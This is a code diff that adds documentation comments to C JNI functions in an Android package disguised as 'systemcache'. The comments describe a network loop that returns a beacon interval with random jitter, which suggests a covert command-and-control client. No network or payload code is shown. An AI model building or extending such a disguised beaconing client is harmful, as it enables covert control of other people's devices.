@@ -5,8 +5,16 @@
 #include "client.h"
 #include "client_config.h"
 #include "common.h"
+
 static int64_t get_random(int64_t max_random);
 
+/**
+ * @brief Main network loop
+ * 
+ * @param[in] env JNI environment pointer
+ * @param[in] thiz Java object reference
+ * @return jlong Next beacon interval in seconds
+ */
 JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_syncData(JNIEnv* env, jobject thiz)
 {
     client_config_t* config = NULL;
@@ -26,6 +34,13 @@ JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_syncData(JNIEnv*
     return next_interval;
 }
 
+/**
+ * @brief Get initial random jitter interval
+ * 
+ * @param[in] env JNI environment pointer
+ * @param[in] thiz Java object reference
+ * @return jlong Random jitter interval in seconds
+ */
 JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_queryEnvironment(JNIEnv* env,
                                                                                  jobject thiz)
 
@@ -46,6 +61,12 @@ JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_queryEnvironment
     return next_interval;
 }
 
+/**
+ * @brief Generate random number in range [-max_random, +max_random]
+ * 
+ * @param[in] max_random Maximum absolute value for random range
+ * @return int64_t Random number in specified range
+ */
 static int64_t get_random(int64_t max_random)
 {
     int64_t random;
